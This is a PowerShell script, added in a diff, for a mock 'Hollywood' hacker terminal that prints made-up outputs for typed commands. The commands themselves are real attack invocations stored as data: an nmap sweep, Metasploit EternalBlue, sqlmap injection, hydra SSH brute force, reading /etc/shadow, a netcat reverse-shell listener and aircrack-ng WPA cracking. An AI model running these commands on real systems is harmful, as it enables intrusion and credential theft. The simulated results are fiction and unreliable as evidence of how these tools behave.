@@ -1,0 +1,145 @@
+﻿. "$PSScriptRoot\..\engine\themes.ps1"
+. "$PSScriptRoot\..\engine\helpers.ps1"
+. "$PSScriptRoot\..\engine\core.ps1"
+
+function Build-HOLLYWOODCOMMANDS {
+    return @(
+        C "whoami" @("root")
+        C "hostname" @("rootnode")
+        C "id" @("uid=0(root) gid=0(root) groups=0(root)")
+        C "ifconfig eth0" @("eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500",
+            "        inet 192.168.1.42  netmask 255.255.255.0  broadcast 192.168.1.255",
+            "        inet6 fe80::cafe:dead:beef:1234  prefixlen 64  scopeid 0x20<link>",
+            "        ether 08:00:27:ab:cd:ef  txqueuelen 1000  (Ethernet)",
+            "        RX packets 124502  bytes 157234567 (150.0 MB)",
+            "        TX packets 89201  bytes 12345678 (11.8 MB)",
+            "        RX errors 0  dropped 2  overruns 0  frame 0",
+            "        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0")
+        Cp "nmap -sV -sC -p- 192.168.1.0/24" @("Starting Nmap 7.94 ( https://nmap.org ) at 2026-03-16 04:20 EDT",
+            "Nmap scan report for 192.168.1.1",
+            "Host is up (0.0023s latency).",
+            "Not shown: 65532 closed tcp ports (reset)",
+            "PORT     STATE SERVICE     VERSION",
+            "80/tcp   open  http        Apache httpd 2.4.57",
+            "443/tcp  open  ssl/https   Apache httpd 2.4.57",
+            "22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3",
+            "3306/tcp open  mysql       MySQL 8.0.35",
+            "MAC Address: 00:1A:2B:3C:4D:5E (Netgear)",
+            "Nmap scan report for 192.168.1.105",
+            "Host is up (0.0018s latency).",
+            "PORT     STATE SERVICE     VERSION",
+            "445/tcp  open  microsoft-ds Windows Server 2022 20348",
+            "3389/tcp open  ms-wbt-server xrdp",
+            "| smb-vuln-ms17-010:",
+            "|   VULNERABLE: Remote Code Execution (EternalBlue)",
+            "|     State: VULNERABLE",
+            "|     IDs:  CVE:CVE-2017-0143",
+            "|     Risk: CRITICAL")
+        C "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@192.168.1.105" @("Warning: Permanently added '192.168.1.105' (ECDSA) to the list of known hosts.",
+            "root@192.168.1.105's password: ",
+            "Authentication successful.",
+            "Microsoft Windows [Version 10.0.20348.234]",
+            "(c) Microsoft Corporation. All rights reserved.",
+            "",
+            "C:\Users\Administrator> whoami",
+            "nt authority\system")
+        C "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.105; run'" @("[*] Started reverse TCP handler on 192.168.1.42:4444",
+            "[*] 192.168.1.105:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check",
+            "[+] 192.168.1.105:445 - Host is likely VULNERABLE to MS17-010!",
+            "[*] 192.168.1.105:445 - Selecting PowerShell target",
+            "[*] 192.168.1.105:445 - Executing auxiliary/scanner/smb/smb_ms17_010",
+            "[+] 192.168.1.105:445 - SMB session established",
+            "[*] Sending stage (200774 bytes) to 192.168.1.105",
+            "[*] Meterpreter session 1 opened (192.168.1.42:4444 -> 192.168.1.105:49172)",
+            "",
+            "meterpreter > getuid",
+            "Server username: NT AUTHORITY\SYSTEM")
+        Cp "sqlmap -u 'http://192.168.1.1/login.php' --dbs --batch" @("        ___",
+            "       __H__",
+            " ___ ___[,]_____ ___ ___  {1.8.2#stable}",
+            "|_ -| . [,]     | .'| . |",
+            "|___|_  [,]_|_|_|__,|  _|",
+            "      |_|V...       |_|   https://sqlmap.org",
+            "",
+            "[*] starting @ 04:35:22 /2026-03-16",
+            "",
+            "[04:35:22] [INFO] testing connection to the target URL",
+            "[04:35:23] [INFO] login.php is POST-based",
+            "[04:35:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'",
+            "[04:35:27] [INFO] target URL appears to be injectable",
+            "[04:35:30] [INFO] fetching database names",
+            "available databases [5]:",
+            "[*] information_schema",
+            "[*] mysql",
+            "[*] performance_schema",
+            "[*] wordpress",
+            "[*] corp_finance")
+        C "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100 -t 4" @("Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak",
+            "",
+            "[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399)",
+            "[STATUS] 189.00 tries/min, 189 tries in 00:01h, 14344210 to do in 1265:37h, 4 active",
+            "[STATUS] 512.00 tries/min, 1024 tries in 00:02h, 14343375 to do in 467:00h, 4 active",
+            "[22][ssh] host: 192.168.1.100   login: admin   password: sunshine123",
+            "[STATUS] attack finished for 192.168.1.100 (waiting for children to complete)",
+            "1 of 1 target successfully completed, 1 valid password found")
+        C "cat /etc/shadow | grep -E 'root|admin'" @("root:$y$j9T$P4V0kJD8eN2mQrXwZvL5c1$s0m3h4shh3r3:19545:0:99999:7:::",
+            "admin:$y$j9T$AbCdEfGhIjKlMnOpQrStUv$WxYz1234567890abcdefgh:19545:0:99999:7:::")
+        C "nc -lvp 4444" @("listening on [any] 4444 ...",
+            "connect to [192.168.1.42] from (UNKNOWN) [192.168.1.105] 49175",
+            "Microsoft Windows [Version 10.0.20348.234]",
+            "(c) Microsoft Corporation. All rights reserved.",
+            "",
+            "C:\Users\Administrator> dir",
+            " Volume in drive C has no label.",
+            " Volume Serial Number is A1B2-C3D4",
+            "",
+            " Directory of C:\Users\Administrator",
+            "",
+            "03/16/2026  04:40 AM    <DIR>          .",
+            "03/16/2026  04:40 AM    <DIR>          ..",
+            "03/16/2026  04:40 AM             2,048 .NTUSER.DAT",
+            "03/16/2026  04:40 AM    <DIR>          Desktop",
+            "03/16/2026  04:40 AM    <DIR>          Documents")
+        C "cat /root/flag.txt" @("========================================",
+            "  FLAG{3t3rN4l_Blu3_0wn3d_y0ur_l4n}",
+            "  Congratulations, agent.",
+            "  Target: 192.168.1.105 (CORP-DC-01)",
+            "  Date: 2026-03-16 04:42 UTC",
+            "========================================",
+            "",
+            "Next mission: infiltrate 10.0.1.0/24")
+        C "ls -la /root/.ssh/" @("total 20",
+            "drwx------ 2 root root 4096 Mar 14 22:10 .",
+            "drwx------ 5 root root 4096 Mar 14 22:05 ..",
+            "-rw------- 1 root root 2610 Mar 14 22:10 id_rsa",
+            "-rw-r--r-- 1 root root  575 Mar 14 22:10 id_rsa.pub",
+            "-rw-r--r-- 1 root root 1024 Mar 15 12:33 known_hosts")
+        C "python3 -c \"import pty; pty.spawn('/bin/bash')\"" @("root@rootnode:/# ")
+        C "ls -la /usr/share/wordlists/" @("total 1048576",
+            "drwxr-xr-x  2 root root      4096 Mar 12 2024 .",
+            "drwxr-xr-x 76 root root      4096 Mar 12 2024 ..",
+            "-rw-r--r--  1 root root 139921507 Mar 12 2024 rockyou.txt",
+            "-rw-r--r--  1 root root  52437800 Mar 12 2024 rockyou.txt.gz",
+            "-rw-r--r--  1 root root   4996537 Mar 12 2024 fasttrack.txt",
+            "-rw-r--r--  1 root root   2824361 Mar 12 2024 common-passwords.txt")
+        Cp "aircrack-ng -a2 -b 00:1A:2B:3C:4D:5E capture.cap" @("Reading packets, please wait...",
+            "Opening capture.cap",
+            "Read 24523 packets.",
+            "",
+            "    #  BSSID              ESSID                     Encryption",
+            "    1  00:1A:2B:3C:4D:5E  CorpWiFi                  WPA (CCMP)",
+            "",
+            "Choosing best network...",
+            "The network is protected by WPA.",
+            "A total of 4 handshakes captured.",
+            "",
+            "Attempting to crack WPA handshake...",
+            "Using rockyou.txt as password list.",
+            "[00:01:23] Found PMKID: 00:1A:2B:3C:4D:5E",
+            "[+] KEY FOUND! [ Winter2024! ]")
+    )
+}
+
+if ($MyInvocation.InvocationName -ne '.') {
+    Start-TerminalSession -CommandBuilder ${function:Build-HOLLYWOODCOMMANDS} -Theme (Get-Theme hollywood) -ModeName "Hollywood" -TargetHost "rootnode" -TargetDomain "darknet" -TargetIP (RandIP) -TargetCompany "NSA" -TargetLocation "Fort Meade" -TargetOS "Kali Linux Rolling" -OSPrompt "agent@rootnode:~#" -AllowFailures
+}
